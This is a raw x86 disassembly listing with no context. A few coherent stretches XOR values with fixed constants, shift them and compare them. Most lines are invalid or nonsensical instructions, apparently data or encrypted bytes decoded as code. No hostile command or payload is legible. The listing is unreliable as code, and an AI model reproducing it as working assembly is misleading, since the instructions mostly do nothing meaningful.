  407d88:	ficom  DWORD PTR [esi-0x1a]
  407d8b:	mov    dl,0x1c
  407d8d:	pop    edx
  407d8e:	test   eax,0x952ae806
  407d93:	rcr    ch,cl
  407d95:	adc    ah,BYTE PTR [esi-0x24]
  407d98:	int3   
  407d99:	shl    ebx,1
  407d9b:	adc    BYTE PTR [ecx-0x5fc27962],bl
  407da1:	mov    gs,WORD PTR [ecx]
  407da3:	jb     0x407d6e
  407da5:	aas    
  407da6:	mov    esi,0x3ab5416a
  407dab:	pop    ecx
  407dac:	sub    dh,ch
  407dae:	lea    esi,[edx+0x2428a9b4]
  407db4:	fldenv [eax+0xf]
  407db7:	mov    BYTE PTR [edi+0x73165afc],0xa0
  407dbe:	add    edi,DWORD PTR [esi]
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0x6d38017e
  407e7d:	mov    al,0x22
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    al,ah
  407e87:	popa   
  407e88:	pop    edi
  407e89:	das    
  407e8a:	mov    ebp,0x93d773e4
  407e8f:	xchg   edx,eax
  407e90:	out    dx,al
  407e91:	jmp    0x661d510d
  407e96:	(bad)  [eax+0x4e061f31]
  407e9c:	test   eax,0x4b615666
  407ea1:	jbe    0x407f0a
  407ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea5:	out    dx,al
  407ea6:	push   ebp
  407ea7:	mov    ch,0x79
  407ea9:	add    al,0x1c
  407eab:	fnstsw WORD PTR [ebx+ecx*1+0x4c371493]
  407eb2:	lea    esi,[edi+0x25]
  407eb5:	push   ds
  407eb6:	shr    edi,cl
  407eb8:	fiadd  WORD PTR [esi-0x782a949a]
  407ebe:	sub    ecx,DWORD PTR [ebx]
  407ec0:	mul    BYTE PTR ds:0x19d4bd6c
  407ec6:	and    DWORD PTR [esp+0x45b3ac40],edi
  407ecd:	mov    ds:0xe70d6086,al
  407ed2:	push   0x80d099c0
  407ed7:	pop    es
  407ed8:	or     esp,DWORD PTR [eax+0x36]
  407edb:	les    esp,FWORD PTR ds:0xc15c0f59
  407ee1:	jp     0x407f1d
  407ee3:	call   0xec777dd8
  407ee8:	adc    DWORD PTR [edi-0x1d],ecx
  407eeb:	retf   0x6ea8
  407eee:	popf   
  407eef:	inc    esp
  407ef0:	std    
  407ef1:	and    BYTE PTR [esi],ch
  407ef3:	cs pop ss
  407ef5:	sub    ch,BYTE PTR [edi+0x328150d5]
  407efb:	shl    BYTE PTR [edi+0x20],cl
  407efe:	cmp    ecx,DWORD PTR [edx+0x351411cc]
  407f04:	add    BYTE PTR [edx],dl
  407f06:	xchg   ebp,eax
  407f07:	push   ds
  407f08:	mov    ah,0x49
  407f0a:	sub    al,BYTE PTR [eax]
  407f0c:	loop   0x407eea
  407f0e:	fst    QWORD PTR [eax-0x165d7602]
  407f14:	or     bl,dl
  407f16:	repnz das 
  407f18:	cld    
  407f19:	mov    cl,0x6c
  407f1b:	xchg   ebp,eax
  407f1c:	mov    bl,0xdb
  407f1e:	xchg   al,al
  407f20:	in     al,dx
  407f21:	adc    eax,0x8308a2fe
  407f26:	ds jmp 0x575d26c2
  407f2c:	retf   0x22d6
  407f2f:	xor    esi,ebx
  407f31:	(bad)  
  407f32:	into   
  407f33:	mov    esi,0xe2b558b8
  407f38:	ds jno 0x407f35
  407f3b:	mov    BYTE PTR [eax+edi*8-0x71c6172],ah
  407f42:	mov    edx,0x5f81837e
  407f47:	sti    
  407f48:	lods   eax,DWORD PTR ds:[esi]
  407f49:	sti    
  407f4a:	arpl   WORD PTR [esi-0x5d],sp
  407f4d:	call   0x8f60:0x77b543aa
  407f54:	mov    ecx,0x6adfe210
  407f59:	and    eax,0xbb391f5e
  407f5e:	loope  0x407f5a
  407f60:	jge    0x407fe1
  407f62:	ins    BYTE PTR es:[edi],dx
  407f63:	cmc    
  407f64:	dec    eax
  407f65:	mov    ebp,DWORD PTR [eax+0x53dcc017]
  407f6b:	push   0xfffffffe
  407f6d:	sahf   
  407f6e:	icebp  
  407f6f:	or     edi,ebx
  407f71:	xchg   ebp,eax
  407f72:	test   eax,0x4c303c37
  407f77:	xchg   esp,eax
  407f78:	fwait
  407f79:	stos   BYTE PTR es:[edi],al
  407f7a:	inc    edx
  407f7b:	aas    
  407f7c:	daa    
  407f7d:	mov    ebx,0x6f5a0c71
  407f82:	jne    0x407fd4
  407f84:	es out dx,eax
  407f86:	icebp  
  407f87:	inc    eax
  407f88:	mov    dl,0x6b
  407f8a:	sbb    cl,ah
  407f8c:	mov    esi,0x47462a44
  407f91:	and    dl,BYTE PTR [esi-0x6d]
  407f94:	into   
  407f95:	adc    eax,ecx
  407f97:	add    al,0xe1
  407f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9a:	imul   BYTE PTR [edi]
  407f9c:	mov    BYTE PTR [ebx+0x5e],ch
  407f9f:	cli    
  407fa0:	out    dx,eax
  407fa1:	and    DWORD PTR [ebx],ebp
  407fa3:	cmc    
  407fa4:	jl     0x407fe2
  407fa6:	in     eax,dx
  407fa7:	aad    0x59
  407fa9:	adc    eax,DWORD PTR [esi-0x5e]
  407fac:	jb     0x407f3d
  407fae:	mov    ds:0x56fd32ef,eax
  407fb3:	mov    ah,0x6
  407fb5:	inc    ecx
  407fb6:	dec    esi
  407fb7:	test   BYTE PTR [edi],ah
  407fb9:	sub    al,BYTE PTR [ecx+eax*8]
  407fbc:	xchg   ebp,eax
  407fbd:	cmc    
  407fbe:	ret    0x6705
  407fc1:	pop    es
  407fc2:	pop    ebp
  407fc3:	fiadd  WORD PTR [esi-0x4c]
  407fc6:	leave  
  407fc7:	sub    ah,BYTE PTR [eax-0x17]
  407fca:	jno    0x407fa1
  407fcc:	cmp    edi,esi
  407fce:	test   eax,0xf423efc7
  407fd3:	stos   BYTE PTR es:[edi],al
  407fd4:	cmp    al,BYTE PTR [edi+0xb0c928c]
  407fda:	fucomi st,st(0)
  407fdc:	xchg   edx,ebp
  407fde:	call   0x28610c6b
  407fe3:	fisttp DWORD PTR ds:0x6614bbb
  407fe9:	pop    edx
  407fea:	test   al,0x35
  407fec:	test   DWORD PTR [ecx+edi*4],edi
  407fef:	imul   esp,DWORD PTR [eax],0xffffffde
  407ff2:	or     esp,DWORD PTR [ecx-0x11]
  407ff5:	(bad)  
  407ff6:	retf   0x41df
  407ff9:	ds fucomi st,st(4)
  407ffc:	xlat   BYTE PTR ds:[ebx]
  407ffd:	cmp    ah,bh
  407fff:	or     ebx,DWORD PTR ds:0x31a395cf
  408005:	or     bh,dl
  408007:	shr    DWORD PTR [edi+edi*1+0x2],0xa
  40800c:	dec    esi
  40800d:	mov    ebp,0x97a43cc0
  408012:	xor    ebx,ebp
  408014:	mov    esp,0xfe078ce4
  408019:	popf   
  40801a:	outs   dx,DWORD PTR ds:[esi]
  40801b:	xchg   ebp,eax
  40801c:	into   
  40801d:	mov    ch,0xcb
  40801f:	sahf   
  408020:	ret    
  408021:	inc    ebp
  408022:	gs sahf 
  408024:	xchg   edx,eax
  408025:	fstp   st(5)
  408027:	mov    ch,BYTE PTR [eax]
  408029:	xor    eax,0x4f3ec8d
  40802e:	inc    esp
  40802f:	aaa    
  408030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408031:	rol    BYTE PTR [ecx+0x618b35f],1
  408037:	and    ah,BYTE PTR [eax-0x37]
  40803a:	add    BYTE PTR [esi],dl
  40803c:	mov    ds:0x7e693efa,eax
  408041:	addr16 repz cmp al,0xfe
  408045:	ds add eax,0xf24da543
  40804b:	dec    edx
  40804c:	adc    dl,BYTE PTR [ebx+0x6a]
  40804f:	and    edi,DWORD PTR [esi]
  408051:	mov    dl,0xc9
  408053:	mov    al,ds:0x34f42745
  408058:	jecxz  0x4080ae
  40805a:	cmp    eax,0xf4e6ac46
  40805f:	xchg   edi,eax
  408060:	or     eax,0x7f349ea6
  408065:	jno    0x4080c9
  408067:	lahf   
  408068:	cli    
  408069:	ins    DWORD PTR es:[edi],dx
  40806a:	sbb    al,0x49
  40806c:	sbb    DWORD PTR [esi-0x290485ed],ecx
  408072:	mov    ebp,0xc10c263
  408077:	popa   
  408078:	sbb    al,0x60
  40807a:	xchg   ebx,eax
  40807b:	lock cmp DWORD PTR [eax+ecx*4+0x2fab661a],esp
  408083:	add    BYTE PTR [ecx-0x36385af0],bl
  408089:	inc    eax
  40808a:	or     BYTE PTR [esi-0x57],dl
  40808d:	xchg   ebx,eax
  40808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40808f:	sub    al,0xac
  408091:	add    ah,bl
  408093:	sahf   
  408094:	ret    
  408095:	xchg   esp,eax
  408096:	sbb    al,0xb8
  408098:	and    dh,BYTE PTR [ebx+0x14]
  40809b:	cld    
  40809c:	pushf  
  40809d:	out    dx,al
  40809e:	or     bl,0x46
  4080a1:	rcl    BYTE PTR [edi+0x2d8a29c6],cl
  4080a7:	out    dx,al
  4080a8:	sahf   
  4080a9:	ins    BYTE PTR es:[edi],dx
  4080aa:	nop
  4080ab:	gs push ss
  4080ad:	hlt    
  4080ae:	cli    
  4080af:	(bad)  
  4080b0:	push   ebx
  4080b1:	inc    ebx
  4080b2:	cs pop ebx
  4080b4:	pop    ss
  4080b5:	mov    esi,0x22c7dfc5
  4080ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080bb:	cld    
  4080bc:	and    ah,BYTE PTR [edx]
  4080be:	(bad)  
  4080bf:	or     BYTE PTR [ebx],ch
  4080c1:	or     al,BYTE PTR [edi+eiz*8-0x9cdb240]
  4080c8:	adc    BYTE PTR [eax],dl
  4080ca:	pop    ebp
  4080cb:	test   eax,0xd2f73879
  4080d0:	push   cs
  4080d1:	or     eax,DWORD PTR [ebx+0x12]
  4080d4:	push   0xffffff91
  4080d6:	mov    esp,0xf462b0ce
  4080db:	cld    
  4080dc:	cmc    
  4080dd:	pop    esp
  4080de:	out    0x64,al
  4080e0:	ds shl edi,0x96
  4080e4:	out    0x55,al
  4080e6:	dec    edi
  4080e7:	out    0xe,al
  4080e9:	sbb    eax,0x1dff7779
  4080ee:	xor    BYTE PTR [edi+0x73],al
  4080f1:	aas    
  4080f2:	(bad)  
  4080f3:	popa   
  4080f4:	pop    ebx
  4080f5:	mov    WORD PTR [eax-0x56f72854],fs
  4080fb:	dec    esp
  4080fc:	stc    
  4080fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080fe:	fcomp  QWORD PTR [edi-0x67540cb5]
  408104:	mov    ebp,0x3993ef98
  408109:	mov    dl,0x7e
  40810b:	push   ss
  40810c:	jnp    0x408147
  40810e:	add    eax,0x5b017dc1
  408113:	xchg   ebx,eax
  408114:	inc    ebp
  408115:	loope  0x40815f
  408117:	nop
  408118:	popa   
  408119:	add    al,BYTE PTR [ecx]
  40811b:	sub    DWORD PTR [edi],esp
  40811d:	add    DWORD PTR [ebp+0x45],ebp
  408120:	call   0x8e23:0x969a4b93
  408127:	jmp    0x239a:0xb83453cb
  40812e:	into   
  40812f:	sbb    DWORD PTR [eax],ecx
  408131:	sub    BYTE PTR [ebx+0x74],ch
  408134:	adc    al,0x62
  408136:	jns    0x4081b4
  408138:	lock cmp al,dh
  40813b:	aas    
  40813c:	in     al,0x91
  40813e:	add    DWORD PTR [edx],esi
  408140:	cmp    BYTE PTR [ebp+0x64b10195],ch
  408146:	scas   al,BYTE PTR es:[edi]
  408147:	outs   dx,BYTE PTR ds:[esi]
  408148:	xchg   BYTE PTR [ebp-0x14],bh
  40814b:	inc    ecx
  40814c:	push   eax
  40814d:	int3   
  40814e:	mov    edx,DWORD PTR [esp+eiz*2+0x6e51c24d]
  408155:	add    ebx,DWORD PTR [ecx+0x4c09be46]
  40815b:	xor    DWORD PTR [ebx],edx
  40815d:	test   eax,0x2766fa
  408162:	iret   
  408163:	xor    dl,bh
  408165:	mov    WORD PTR [edx+ebp*8+0x22d38390],ss
  40816c:	mov    eax,ds:0xa20c25c
  408171:	dec    esp
  408172:	adc    al,0x20
  408174:	test   DWORD PTR [ebp+0x66877b36],ebx
  40817a:	mov    gs,WORD PTR [eax+ecx*8]
  40817d:	(bad)  
  40817e:	mov    bl,0x22
  408180:	add    eax,0x3ac89ae1
  408185:	pop    ds
  408186:	aaa    
  408187:	pop    ss
  408188:	es stos BYTE PTR es:[edi],al
  40818a:	adc    al,0x9e
  40818c:	out    dx,eax
  40818d:	shl    eax,0xf5
  408190:	scas   eax,DWORD PTR es:[edi]
  408191:	pop    ss
  408192:	xchg   esp,eax
  408193:	arpl   WORD PTR [edx+0x46],bp
  408196:	dec    ebp
  408197:	enter  0x4ea8,0xd0
  40819b:	inc    ebp
  40819c:	cmp    eax,0x95588ed4
  4081a1:	inc    esp
  4081a2:	int    0x99
  4081a4:	and    eax,0xb13724e6
  4081a9:	sbb    BYTE PTR [ecx-0x49],ah
  4081ac:	aad    0xf6
  4081ae:	sub    ecx,DWORD PTR [esi]
  4081b0:	ret    
  4081b1:	hlt    
  4081b2:	cld    
  4081b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b4:	xchg   BYTE PTR [edi-0x7ebdb4a4],dh
  4081ba:	push   edx
  4081bb:	push   esi
  4081bc:	sahf   
  4081bd:	shl    BYTE PTR [ebx+ecx*1],cl
  4081c0:	dec    edx
  4081c1:	push   esp
  4081c2:	mov    BYTE PTR [ebx+0x55],al
  4081c5:	sub    bl,BYTE PTR [esi-0x41]
  4081c8:	sub    BYTE PTR [ecx],bl
  4081ca:	jmp    0x4143:0x87e01b19
  4081d1:	inc    eax
  4081d2:	lds    eax,FWORD PTR [edi-0x3b68f4ef]
  4081d8:	push   cs
  4081d9:	and    ah,0x2c
  4081dc:	aad    0xcd
  4081de:	and    DWORD PTR [edx-0x7b8eb897],0xffffffc2
  4081e5:	xor    DWORD PTR [edi],eax
  4081e7:	fcomp  QWORD PTR [eax]
  4081e9:	and    al,0xc
  4081eb:	test   eax,0xa0b4d189
  4081f0:	gs daa 
  4081f2:	scas   al,BYTE PTR es:[edi]
  4081f3:	and    al,0x9f
  4081f6:	(bad)  
  4081f7:	out    dx,al
  4081f8:	pop    esp
  4081f9:	cmp    al,0x2b
  4081fb:	daa    
  4081fc:	jmp    0x4081a5
  4081fe:	(bad)  
  4081ff:	repz jo 0x4081ee
  408202:	inc    esp
  408203:	aad    0x7
  408205:	es in  al,0x1
  408208:	in     eax,dx
  408209:	xchg   ebx,eax
  40820a:	adc    al,bh
  40820c:	mov    eax,ds:0x2441870f
  408211:	add    BYTE PTR [edi+0x8],bh
  408214:	leave  
  408215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408216:	(bad)  
  408217:	addr16 inc ebx
  408219:	jl     0x4081b5
  40821b:	xor    bh,BYTE PTR [esi+0x1f4f0c5e]
  408221:	mov    bl,0x2c
  408223:	cmp    ecx,DWORD PTR [ebx-0x59da12a3]
  408229:	push   esi
  40822a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40822b:	sar    DWORD PTR [esi+eax*8+0x32],0x5b
  408230:	push   0x1b67df16
  408235:	fcom   DWORD PTR [esi+edi*8-0x4e]
  408239:	popf   
  40823a:	jns    0x4081e7
  40823c:	(bad)  
  40823d:	add    eax,0xb84e13ad
  408242:	repz adc ebx,DWORD PTR [ebp+ebx*4-0x6bba76ca]
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0xeecd709d
  40828a:	(bad)  
  40828b:	jl     0x408235
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [edi+0x9e0d484],ch
  408299:	popf   
  40829a:	jp     0x4082b0
  40829c:	xchg   esi,eax
  40829d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40829e:	lods   al,BYTE PTR ds:[esi]
  40829f:	and    eax,0xd7545ce4
  4082a4:	push   0xffffffd6
  4082a6:	pop    ss
  4082a7:	aas    
  4082a8:	dec    ebp
  4082a9:	mov    dl,0x41
  4082ab:	frstor [esi-0x1df56092]
  4082b1:	xchg   edx,eax
  4082b2:	cmp    DWORD PTR [esi-0x43b2686],esp
  4082b8:	ja     0x4082c2
  4082ba:	or     edx,DWORD PTR [edx+0x11]
  4082bd:	xchg   edx,eax
  4082be:	pop    ebp
  4082bf:	retf   0xf806
  4082c2:	mov    ebp,0x77c7934f
  4082c7:	fwait
  4082c8:	jns    0x408334
  4082ca:	and    eax,0x6ae6767
  4082cf:	xor    esp,DWORD PTR [edx-0x40964838]
  4082d5:	jne    0x4082ad
  4082d7:	ficom  WORD PTR ds:0x942d7e76
  4082dd:	adc    eax,DWORD PTR [ecx]
  4082df:	pop    ebx
  4082e0:	push   ss
  4082e1:	out    dx,eax
  4082e2:	pusha  
  4082e3:	lds    edi,FWORD PTR [edx+0x69]
  4082e6:	push   es
  4082e7:	push   0xffffffc6
  4082e9:	(bad)  
  4082eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082ec:	stos   DWORD PTR es:[edi],eax
  4082ed:	xchg   edi,eax
  4082ee:	outs   dx,WORD PTR ds:[esi]
  4082f0:	rcl    ecx,cl
  4082f2:	lea    edx,[esp+ecx*8-0x48]
  4082f6:	inc    DWORD PTR [ecx+0x4d]
  4082f9:	inc    ebx
  4082fa:	enter  0xd25b,0xbd
  4082fe:	push   es
  4082ff:	pop    ebp
  408300:	and    eax,0x8231d98c
  408305:	xchg   ecx,eax
  408306:	aam    0x7
  408308:	pop    ebx
  408309:	xchg   edi,eax
  40830a:	(bad)  
  40830b:	adc    al,BYTE PTR [edi]
  40830d:	lods   eax,DWORD PTR ds:[esi]
  40830e:	(bad)  
  40830f:	jp     0x40831f
  408311:	repz xchg ecx,eax
  408313:	outs   dx,DWORD PTR ds:[esi]
  408314:	shr    dl,1
  408316:	int3   
  408317:	aam    0xe6
  408319:	and    ecx,DWORD PTR [edx]
  40831b:	pop    esi
  40831c:	fs aas 
  40831e:	ret    0x1f47
  408321:	push   0xffffff8d
  408323:	sbb    eax,0xaee54cc9
  408328:	push   edx
  408329:	push   ebp
  40832a:	fsubr  DWORD PTR [edx-0x7235f20]
  408330:	rol    DWORD PTR [eax-0x58],1
  408333:	outs   dx,DWORD PTR ds:[esi]
  408334:	ret    
  408335:	data16 shr ch,0xbf
  408339:	mov    bl,0xb8
  40833b:	fs loopne 0x40835f
  40833e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833f:	aad    0xb5
  408341:	mov    bl,BYTE PTR [ecx+ecx*1+0x6527d77f]
  408348:	jmp    0xf348b5b
  40834d:	or     eax,0x2eb888f9
  408352:	push   ds
  408353:	jge    0x4083ad
  408355:	clc    
  408356:	cdq    
  408357:	out    dx,eax
  408358:	cs loope 0x4082f8
  40835b:	sbb    ah,al
  40835d:	fcmovbe st,st(4)
  40835f:	adc    DWORD PTR [edi+esi*4+0x11],eax
  408363:	jle    0x40830f
  408365:	sbb    esi,DWORD PTR [eax]
  408367:	pop    esi
  408368:	lock xchg DWORD PTR [edi+0x31180a11],ecx
  40836f:	pop    esp
  408370:	mov    ecx,0x7afdeb61
  408375:	jae    0x408381
  408377:	in     eax,dx
  408378:	sub    eax,0x30e33458
  40837d:	push   ebx
  40837e:	mov    edi,0xcfd7c181
  408383:	lods   al,BYTE PTR ds:[esi]
  408384:	jo     0x4083e3
  408386:	stc    
  408387:	push   es
  408388:	dec    esi
  408389:	push   edi
  40838a:	div    DWORD PTR [edi+0x24e52552]
  408390:	aam    0x1d
  408392:	pusha  
  408393:	jp     0x40835b
  408395:	jg     0x40837e
  408397:	sar    DWORD PTR [edi+0x1b],1
  40839a:	sub    al,0xd1
  40839c:	xchg   ebx,eax
  40839d:	cmc    
  40839e:	ret    
  40839f:	rcl    DWORD PTR [eax],cl
  4083a1:	int    0xad
  4083a3:	jmp    0x2ed84c36
  4083a8:	sbb    DWORD PTR es:[edx+ebx*2-0x5a],ecx
  4083ad:	mov    WORD PTR [ebx+edi*2],fs
  4083b0:	sub    DWORD PTR [ebx-0x4b1a8bb0],0xd9763cce
  4083ba:	jbe    0x40840d
  4083bc:	enter  0x6ad1,0x6f
  4083c0:	jl     0x408440
  4083c2:	test   al,0x72
  4083c4:	push   0x1a
  4083c6:	jmp    FWORD PTR [eax+0x3592e850]
  4083cc:	pusha  
  4083cd:	fs sbb eax,0xb1e0ef2e
  4083d3:	loope  0x4083d7
  4083d5:	inc    edi
  4083d6:	inc    eax
  4083d7:	sti    
  4083d8:	mov    eax,ds:0x58cd9050
  4083dd:	test   DWORD PTR [esi+edx*4],ebx
  4083e0:	sbb    al,0x79
  4083e2:	jnp    0x4083b7
  4083e4:	or     bh,BYTE PTR [edi+0x449a3bfe]
  4083ea:	lods   al,BYTE PTR ds:[esi]
  4083eb:	adc    DWORD PTR [ebp-0x588bf7c1],esp
  4083f1:	ret    0xe714
  4083f4:	addr16 nop
  4083f6:	retf   
  4083f7:	data16 (bad) 
  4083f9:	out    dx,eax
  4083fa:	or     ah,BYTE PTR [edi]
  4083fc:	mov    al,0x51
  4083fe:	jo     0x4083b9
  408400:	sbb    eax,0xf06339f9
  408405:	sub    al,0xf1
  408407:	stc    
  408408:	int    0xe
  40840a:	push   esp
  40840b:	add    eax,0x41393f04
  408410:	mov    al,0x48
  408412:	mov    esp,DWORD PTR [ecx-0x51]
  408415:	loop   0x408418
  408417:	cmp    al,0xdd
  408419:	pop    ss
  40841a:	stos   DWORD PTR es:[edi],eax
  40841b:	shr    BYTE PTR [ebx],cl
  40841d:	xlat   BYTE PTR cs:[ebx]
  40841f:	add    eax,0x2bc0fb02
  408424:	repz cs in al,dx
  408427:	mov    cl,0x59
  408429:	push   ebx
  40842a:	or     dl,BYTE PTR [eax-0x7]
  40842d:	or     eax,0x22534289
  408432:	push   edx
  408433:	test   ah,cl
  408435:	cmp    BYTE PTR [edx],ch
  408437:	sub    eax,0x2967d501
  40843c:	mov    ?,WORD PTR [ebp-0x78ae5b01]
  408442:	cmp    dh,ah
  408444:	adc    al,0x73
  408446:	cmp    DWORD PTR [edx+ebx*2-0x74],eax
  40844a:	div    BYTE PTR es:[eax+0x5b]
  40844e:	pop    es
  40844f:	faddp  st(3),st
  408451:	sbb    BYTE PTR [edx+0x9],dl
  408454:	or     DWORD PTR [ecx+ecx*2],0xc40d2f4f
  40845b:	jl     0x40849d
  40845d:	push   esp
  40845e:	inc    esi
  40845f:	adc    bh,cl
  408461:	(bad)  
  408462:	cmp    ebx,DWORD PTR [ebp+0x22]
  408465:	outs   dx,BYTE PTR ds:[esi]
  408466:	push   esp
  408467:	jae    0x408407
  408469:	pop    ds
  40846a:	pop    esp
  40846b:	jmp    0x60f4:0xc59f908d
  408472:	cld    
  408473:	iret   
  408474:	mov    esi,0x97acb7a8
  408479:	test   DWORD PTR [esi],esi
  40847b:	jmp    0xd342:0xdacb6f2e
  408482:	in     al,dx
  408483:	aam    0xc0
  408485:	mov    ds:0x41a614d3,al
  40848a:	test   BYTE PTR [eax-0x371301d3],ch
  408490:	aas    
  408491:	cs ret 
  408493:	in     eax,dx
  408494:	push   edi
  408495:	out    0xc3,al
  408497:	popf   
  408498:	dec    esi
  408499:	rcr    ch,1
  40849b:	xchg   ecx,eax
  40849c:	div    DWORD PTR [ebp+0x2b5637dd]
  4084a2:	(bad)  
  4084a3:	es nop
  4084a5:	popf   
  4084a6:	pushfw 
  4084a8:	push   0x312f2f26
  4084ad:	int3   
  4084ae:	call   0x9ab9:0xf2a80ed3
  4084b5:	out    0xd3,al
  4084b7:	pop    ecx
  4084b8:	and    eax,DWORD PTR [esi-0x16aab3f]
  4084be:	nop
  4084bf:	xor    BYTE PTR [esi],dl
  4084c1:	jo     0x4084f3
  4084c3:	jle    0x408448
  4084c5:	mov    eax,ds:0x4b5a596f
  4084ca:	inc    esp
  4084cb:	sbb    al,0x8b
  4084cd:	in     al,dx
  4084ce:	out    0x82,eax
  4084d0:	dec    ebp
  4084d1:	call   0x84f3:0x5b71638e
  4084d8:	xchg   esi,eax
  4084d9:	lds    ebp,FWORD PTR [edi+0x52]
  4084dc:	xor    esp,DWORD PTR [ecx+ebx*1]
  4084df:	push   eax
  4084e0:	sar    DWORD PTR [ecx+edx*1],1
  4084e3:	bound  ecx,QWORD PTR [ebx]
  4084e5:	enter  0xe7fe,0x35
  4084e9:	nop
  4084ea:	mov    cl,0xc9
  4084ec:	xchg   esp,eax
  4084ed:	aas    
  4084ee:	into   
  4084ef:	iret   
  4084f0:	jae    0x4084fb
  4084f2:	push   0x23
  4084f4:	jle    0x408523
  4084f6:	jns    0x408507
  4084f8:	call   0x20ba:0x75ae9680
  4084ff:	dec    ecx
  408500:	(bad)  
  408501:	mov    BYTE PTR ds:0x98652468,dh
  408507:	cmc    
  408508:	or     BYTE PTR [ecx],dl
  40850a:	adc    ecx,eax
  40850c:	and    eax,0xc73611c1
  408511:	add    BYTE PTR [esi],al
  408513:	mov    cl,0x8
  408515:	test   DWORD PTR [esi],esi
  408517:	mov    ds:0x353b8aa,eax
  40851c:	outs   dx,BYTE PTR es:[esi]
  40851e:	fiadd  DWORD PTR [ecx]
  408520:	or     BYTE PTR [ebx-0x22ce7f5c],ch
  408526:	fsub   QWORD PTR ds:0xc3efee9d
  40852c:	cwde   
  40852d:	mov    ah,BYTE PTR [eax-0x27]
  408530:	dec    edx
  408531:	test   al,bl
  408533:	aad    0x7f
  408535:	sbb    ecx,esp
  408537:	push   eax
  408538:	jecxz  0x408598
  40853a:	leave  
  40853b:	leave  
  40853c:	mov    dl,0x79
  40853e:	mov    ds:0x1bbc9504,al
  408543:	and    eax,0xa8f619fd
  408548:	sti    
  408549:	loope  0x4085c3
  40854b:	adc    ch,0x3e
  40854e:	enter  0x7e3a,0x5e
  408552:	das    
  408553:	in     al,0x65
  408555:	sub    DWORD PTR [ebx],0x4192f9e7
  40855b:	sub    DWORD PTR [edi+0x1a],esi
  40855e:	xor    DWORD PTR [edi+0x7b73d5c8],esp
  408564:	cld    
  408565:	in     al,dx
  408566:	xchg   ebp,eax
